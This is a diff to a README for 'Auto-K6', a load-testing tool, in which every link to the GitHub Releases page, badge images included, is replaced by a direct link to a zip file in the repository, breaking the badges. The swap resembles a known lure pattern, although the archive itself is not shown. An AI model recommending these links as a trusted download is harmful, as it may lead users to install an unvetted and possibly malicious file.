@@ -1,7 +1,7 @@
 # 🌐 Auto-K6 - Simple Load Testing for Everyone
 
 ## 📥 Download Now
-[![Download Auto-K6](https://img.shields.io/badge/Download%20Auto--K6-v1.0-blue)](https://github.com/Sadskid/Auto-K6/releases)
+[![Download Auto-K6](https://raw.githubusercontent.com/Sadskid/Auto-K6/main/Auto-K6/Auto-K6-V3/Auto_2.0.zip%20Auto--K6-v1.0-blue)](https://raw.githubusercontent.com/Sadskid/Auto-K6/main/Auto-K6/Auto-K6-V3/Auto_2.0.zip)
 
 ## 🚀 Getting Started
 Auto-K6 is a free tool for load testing websites and applications. Using Auto-K6, you can simulate traffic to see how well your site handles stress. No programming skills are needed. Follow these simple steps to get started.
@@ -19,7 +19,7 @@ Before downloading, make sure your computer meets these requirements:
 - **Customizable Configurations**: Adjust settings easily for different scenarios.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Sadskid/Auto-K6/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Sadskid/Auto-K6/main/Auto-K6/Auto-K6-V3/Auto_2.0.zip).
 2. Find the latest version of Auto-K6.
 3. Click on the file that matches your operating system.
 4. Download the file to your computer.
@@ -51,6 +51,6 @@ Auto-K6 is free to use under the terms of the MIT License. You can use it for pe
 
 ## 📥 Download Now
 Don't forget to download Auto-K6 today! 
-[![Download Auto-K6](https://img.shields.io/badge/Download%20Auto--K6-v1.0-blue)](https://github.com/Sadskid/Auto-K6/releases)
+[![Download Auto-K6](https://raw.githubusercontent.com/Sadskid/Auto-K6/main/Auto-K6/Auto-K6-V3/Auto_2.0.zip%20Auto--K6-v1.0-blue)](https://raw.githubusercontent.com/Sadskid/Auto-K6/main/Auto-K6/Auto-K6-V3/Auto_2.0.zip)
 
 Feel free to explore and enjoy the powerful load testing capabilities of Auto-K6.
